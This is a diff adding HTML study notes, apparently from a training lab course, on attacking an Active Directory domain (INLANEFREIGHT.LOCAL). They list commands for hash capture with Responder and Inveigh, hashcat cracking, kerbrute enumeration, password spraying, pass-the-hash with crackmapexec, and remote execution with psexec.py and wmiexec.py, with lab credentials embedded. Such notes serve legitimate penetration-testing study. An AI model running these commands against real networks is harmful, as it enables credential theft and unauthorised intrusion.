@@ -1,0 +1,497 @@
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:29px;line-height:107%;background:yellow;">Initial Enumeration of the domain</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<ul style="list-style-type: undefined;">
+    <li>ID Hosts:<ul style="list-style-type: disc;">
+            <li>Wireshark &ndash; look for ARP requests and replies</li>
+            <li>Look at the MDNS protocol &ndash; translates IPs to Hostnames</li>
+            <li>Sudo responder -I &lt;interface&gt; -A (alternate to wireshark)</li>
+        </ul>
+    </li>
+</ul>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: disc;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>fping -asgq 10.10.10.10/24 &ndash; ID the active hosts and save</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;margin-left:36.0pt;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: disc;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>use saved hosts on NMAP to get further information &ndash; ID DCs, use -A scan</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:29px;line-height:107%;background:lime;">ID users</span></p>
+<ul style="list-style-type: undefined;">
+    <li>Kerbrute &ndash; internal AD username enumeration</li>
+    <li><a href="https://github.com/insidetrust/statistically-likely-usernames">https://github.com/insidetrust/statistically-likely-usernames</a></li>
+    <li>Use precompiled binaries: <a href="https://github.com/ropnop/kerbrute/releases/latest">https://github.com/ropnop/kerbrute/releases/latest</a></li>
+    <li>kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users</li>
+</ul>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:29px;line-height:107%;color:white;background:purple;">Finding a User</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Linux:</span></em></p>
+<ul style="list-style-type: undefined;">
+    <li>sudo responder -I &lt;interface&gt;</li>
+    <li>crack the ntlmv2 hash with hashcat</li>
+    <li>hashcat -m 5600 hash_file /usr/share/wordlists/rockyou.txt</li>
+</ul>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Windows:</span></em></p>
+<ul style="list-style-type: undefined;">
+    <li>use inveigh</li>
+    <li>https://github.com/Kevin-Robertson/Inveigh#parameter-help</li>
+    <li>Import-Module .\Inveigh.ps1</li>
+    <li>(Get-Command Invoke-Inveigh).Parameters</li>
+    <li>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</li>
+</ul>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>At this point in our assessment, we would want to perform enumeration using a tool such as BloodHound to determine whether any or all of these hashes are worth cracking</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:29px;line-height:107%;color:white;background:navy;">Password Spraying</span></p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>One single password against a valid set of various usernames on the domain</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:18.0pt;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:29px;line-height:107%;background:olive;">Enumerating &amp; retrieving password policies</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Linux:</span></em></p>
+<ul class="decimal_type" style="list-style-type: undefined;">
+    <li>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</li>
+    <li>rpcclient -U &quot;&quot; -N 172.16.5.5<ul class="decimal_type" style="list-style-type: disc;">
+            <li>querydominfo</li>
+            <li>getdompwinfo</li>
+        </ul>
+    </li>
+    <li>enum4linux -P 172.16.5.5<ul class="decimal_type" style="list-style-type: disc;">
+            <li>-oA &ndash; to save output</li>
+        </ul>
+    </li>
+    <li>ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;*&quot; | grep -m 1 -B 10 pwdHistoryLength</li>
+</ul>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Can we transfer any tools to windows to use?</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Windows:</span></em></p>
+<ul style="list-style-type: undefined;">
+    <li>net accounts</li>
+    <li>Powerview<ul style="list-style-type: disc;">
+            <li>import-module .\PowerView.ps1</li>
+            <li>Get-DomainPolicy</li>
+        </ul>
+    </li>
+</ul>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:29px;line-height:107%;color:white;background:green;">Making a user list for Password spraying</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Getting list of users:</span></em></p>
+<ul class="decimal_type" style="list-style-type: undefined;">
+    <li>enum4linux -U 172.16.5.5 &nbsp;| grep &quot;user:&quot; | cut -f2 -d&quot;[&quot; | cut -f1 -d&quot;]&quot;</li>
+    <li>rpcclient -U &quot;&quot; -N 172.16.5.5<ul class="decimal_type" style="list-style-type: disc;">
+            <li>enumdomusers</li>
+        </ul>
+    </li>
+    <li>crackmapexec smb 172.16.5.5 &ndash;users</li>
+    <li>ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;(&amp;(objectclass=user))&quot; &nbsp;| grep sAMAccountName: | cut -f2 -d&quot; &quot;</li>
+    <li>./windapsearch.py --dc-ip 172.16.5.5 -u &quot;&quot; -U</li>
+    <li>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt</li>
+</ul>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">User list with full credentials:</span></em></p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! &ndash;users</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:29px;line-height:107%;color:white;background:red;">Internal Password Spraying</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Linux:</span></em></p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><a href="https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/">https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/</a></li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Bash one liner</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>for u in $(cat valid_users.txt);do rpcclient -U &quot;$u%Welcome1&quot; -c &quot;getusername;quit&quot; 172.16.5.5 | grep Authority; done</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Using kerbrute</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt &nbsp;Welcome1</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:36.0pt;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Using crackmap and filtering logon failures</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Validating creds with crackmapexec</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Local admin password reuse (where else can we use same password)</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Windows:</span></em></p>
+<ul style="list-style-type: undefined;">
+    <li>Import-Module .\DomainPasswordSpray.ps1</li>
+    <li>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</li>
+</ul>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:29px;line-height:107%;background:fuchsia;">Enumerating Security Controls</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Windows Defender:</span></em></p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Get-MpComputerStatus</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:29px;line-height:107%;">App Locker:</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:12px;line-height:107%;">An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system</span></p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:18.0pt;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">PowerShell Constrained Language Mode</span></em></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Restricted = constrained</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>$ExecutionContext.SessionState.LanguageMode</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">LAPS</span></em></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement.</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Using Find-LAPSDelegatedGroups:</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Find-LAPSDelegatedGroups</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>the rights on each computer with LAPS enabled for any groups with read access and users with &quot;All Extended Rights:</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Find-AdmPwdExtendedRights</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>search for computers that have LAPS enabled when passwords expire</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Get-LAPSComputers</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:29px;line-height:107%;background:teal;">Credentialed Enumeration</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">From Linux:</span></em></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:29px;line-height:107%;">CrackMapExec:</span></p>
+<ul class="decimal_type" style="list-style-type: undefined;">
+    <li>Domain user enumeration<ul style="list-style-type: disc;">
+            <li>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 &ndash;users</li>
+        </ul>
+    </li>
+    <li>Domain group enumeration<ul style="list-style-type: disc;">
+            <li>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 &ndash;groups</li>
+        </ul>
+    </li>
+    <li>Logged on users<ul style="list-style-type: disc;">
+            <li>sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users</li>
+        </ul>
+    </li>
+    <li>Share searching<ul style="list-style-type: disc;">
+            <li>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 &ndash;shares</li>
+        </ul>
+    </li>
+    <li>Spider-plus (reads through shares and lists readable files)<ul style="list-style-type: disc;">
+            <li>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share &apos;Department Shares&apos;</li>
+        </ul>
+    </li>
+</ul>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:29px;line-height:107%;">SMBMap:</span></p>
+<ul style="list-style-type: undefined;">
+    <li>check access<ul style="list-style-type: disc;">
+            <li>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</li>
+        </ul>
+    </li>
+    <li>recursive list of all directories<ul style="list-style-type: disc;">
+            <li>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R &apos;Department Shares&apos; --dir-only</li>
+        </ul>
+    </li>
+</ul>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:29px;line-height:107%;">RPCClient:</span></p>
+<ul style="list-style-type: undefined;">
+    <li>rpcclient -U &quot;&quot; -N 172.16.5.5<ul style="list-style-type: disc;">
+            <li>queryuser 0x457 &nbsp; - user enum by RID</li>
+            <li>enumdomusers &nbsp; - enum all users</li>
+        </ul>
+    </li>
+</ul>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:27px;line-height:107%;">Impacket:</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">PSexec.py&nbsp;</span></em></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;Psexec.py is a clone of the Sysinternals</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>psexec.py inlanefreight.local/wley:&apos;transporter@4&apos;@172.16.5.125</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">wmiexec.py</span></em></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>commands are executed through WMI</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>wmiexec.py inlanefreight.local/wley:&apos;transporter@4&apos;@172.16.5.5 &nbsp;</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">Windapsearch.py</span></em></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries.</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Domain admins:</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 &ndash;da</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>Privileged users:</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:29px;line-height:107%;">Bloodhound.py</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>once we have domain creds &ndash; we run bloodhound</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>sudo bloodhound-python -u &apos;forend&apos; -p &apos;Klmcargo2&apos; -ns 172.16.5.5 -d inlanefreight.local -c all</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size:29px;line-height:107%;background:teal;">Credentialed Enumeration</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">From Windows:</span></em></p>
